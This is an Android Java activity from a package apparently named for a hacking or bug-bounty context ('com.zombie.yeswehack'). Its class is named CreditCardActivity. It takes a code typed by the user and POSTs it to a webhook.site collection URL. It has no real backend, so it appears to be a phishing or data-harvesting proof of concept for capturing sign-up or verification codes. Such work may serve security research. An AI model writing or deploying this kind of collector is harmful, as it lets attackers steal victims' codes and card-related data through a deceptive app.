package com.zombie.yeswehack;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CreditCardActivity extends AppCompatActivity {

    // Declare the views
    private EditText e1;
    private Button btn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_credit_card);

        // Initialize the views here
        e1 = findViewById(R.id.signup_code);
        btn = findViewById(R.id.confirm_button);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String code = e1.getText().toString();
                if (!code.isEmpty()) {
                    sendSignupCodeToServer(code);
                } else {
                    Toast.makeText(CreditCardActivity.this, "Please enter a valid sign-up code", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    private void sendSignupCodeToServer(String signupCode) {
        new Thread(() -> {
            try {
                String serverUrl = "https://webhook.site/972e4f42-4654-4c15-b1dc-1e5a9c769ef1";
                String payload = "signupCode=" + signupCode;

                URL url = new URL(serverUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                OutputStream os = connection.getOutputStream();
                os.write(payload.getBytes());
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                System.out.println("Response Code: " + responseCode); // Log response code

                if (responseCode == 200) {
                    runOnUiThread(() -> Toast.makeText(CreditCardActivity.this, "Code sent successfully!", Toast.LENGTH_SHORT).show());
                } else {
                    runOnUiThread(() -> Toast.makeText(CreditCardActivity.this, "Failed to send the code. Please try again.", Toast.LENGTH_SHORT).show());
                }

                connection.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(CreditCardActivity.this, "An error occurred!", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }
}